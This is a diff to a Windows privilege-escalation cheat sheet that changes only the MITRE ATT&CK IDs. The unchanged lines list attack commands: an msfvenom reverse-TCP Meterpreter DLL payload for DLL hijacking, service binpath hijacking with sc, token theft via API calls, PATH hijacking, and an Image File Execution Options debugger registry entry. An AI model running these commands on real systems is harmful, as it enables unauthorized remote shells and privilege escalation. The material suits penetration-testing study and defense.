@@ -1,6 +1,6 @@
 # Windows Privilege Escalation
 
-## DLL Hijacking (T1038)
+## DLL Hijacking (T1574.001)
 - Use Process Monitor to find missing DLL loads (NAME NOT FOUND) in privileged apps
 - Place malicious DLL in writable directory that's searched before system dirs
 - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f dll > evil.dll`
@@ -24,7 +24,7 @@ sc config evilsvc binpath= "c:\payload.exe"
 sc start evilsvc
 ```
 
-## Access Token Manipulation (T1134)
+## Access Token Manipulation (T1134.001)
 - Steal token from privileged process using:
   `OpenProcess` -> `OpenProcessToken` -> `DuplicateTokenEx` -> `CreateProcessWithTokenW`
 - Impersonate token of SYSTEM or Domain Admin processes
@@ -38,7 +38,7 @@ sc start evilsvc
 - If writable directory precedes system32 in $PATH, drop malicious cmd.exe/powershell.exe
 - Exploitable when SYSTEM-level software deployment calls common binaries
 
-## Image File Execution Options (T1183)
+## Image File Execution Options (T1546.012)
 ```cmd
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\targetapp.exe" /v Debugger /d "c:\payload.exe"
 ```
